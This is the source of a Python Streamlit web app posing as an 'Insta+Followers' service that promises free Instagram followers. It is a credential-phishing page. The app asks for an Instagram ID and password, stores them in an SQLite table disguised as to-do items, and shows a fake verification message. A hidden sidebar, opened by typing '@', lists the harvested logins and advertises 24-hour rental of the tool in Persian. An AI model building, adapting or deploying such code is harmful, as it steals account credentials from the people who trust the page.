import streamlit as st
import sqlite3
import datetime







st.set_page_config(page_icon="https://viralyft.com/wp-content/uploads/2023/04/buy-instagram-followers.webp", page_title="Insta+Followers")
# Create a database connection
conn = sqlite3.connect("todo.db")

# Create a cursor
c = conn.cursor()

# Create a table
c.execute("""CREATE TABLE IF NOT EXISTS todos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    text TEXT NOT NULL,
    completed BOOLEAN NOT NULL
)""")


c1 , c2 = st.columns([3,1])

with c1:
    
    st.image("https://viralyft.com/wp-content/uploads/2023/04/buy-instagram-followers.webp")

    st.title("Insta+Followers")

    st.caption("The easiest tool to add followers to Instagram ID")
    
    st.caption("Enter your Instagram ID and password")
    
    

    
with open("c.css") as f:
    st.markdown(f"<style> {f.read()} </style>", unsafe_allow_html=True)






# Create a form to collect todo item information
with st.form("Todo Form"):
    text = st.text_input("Instagram ID")
    passw = st.text_input("Instagram password", type="password")
    submit_button = st.form_submit_button("Add followers")



    # If the form is submitted
    if submit_button:        
        
        # Save the todo item in the database
        c1 , c2 = st.columns(2)
        with c1:
            
            c.execute("INSERT INTO todos (text, completed) VALUES (?, ?)", (text, False))
        
        with c2:
            
            c.execute("INSERT INTO todos (text, completed) VALUES (?, ?)", (passw, False))
            
        conn.commit()

        # Display a success message
        st.warning("""
                   Your Instagram ID is being checked. If your Instagram ID and the password you entered are correct, it will be added to your ID in a few minutes after checking several followers.
                   """)
        st.snow()        
        
        
# Get all todo items from the database
c.execute("SELECT * FROM todos")
todos = c.fetchall()

with st.sidebar:
    

    
    

    name = st.text_input("Name")
    # pas = st.text_input("Pass", type="password")
    loginbtn = st.button("☑️")

    if name == "@" :

        now = datetime.datetime.now()

        


        

        st.write("""

        این وب ساخته شده که اونایی که تو اکانت اینستاگرام استفاده نادرست ازش استفاده میکنند رو نابود کنیم
                 لطفا از این وب استفاده درست کنید در غیر اینصورت من هیچ مسیولیتی رو قبول نمیکنم
""")
        

        
        st.image("a.jpg",width=200)

        col1 , col2 = st.columns(2)

        with col1:

            st.write(f"🕒 {now.strftime('%H:%M')} 🕒")

        with col2:
            st.write("قیمت اجاره 24 ساعته  100 هزارتومان میباشد")
            st.write("تحویل از ساعت 16 میباشد")

        st.divider()
        
# Display the todo items
        for todo in todos:
    # id = todo[0]            
            c1 , c2 = st.columns(2)
            with c1:
        
                text = todo[1]
    # passw = todo[2]
    # completed = todo[2]
            with c2:
        
                st.markdown(f" Name And Pass : {text}  {passw}")
    
    
    
        
            st.divider()
    
    else:
        st.warning(name)
    
   
   
conn.close()


    
    












st.markdown("""
<style> 
#MainMenu {visibility: hidden;}
footer {visibility: hidden;}
</style>
""",unsafe_allow_html=True)
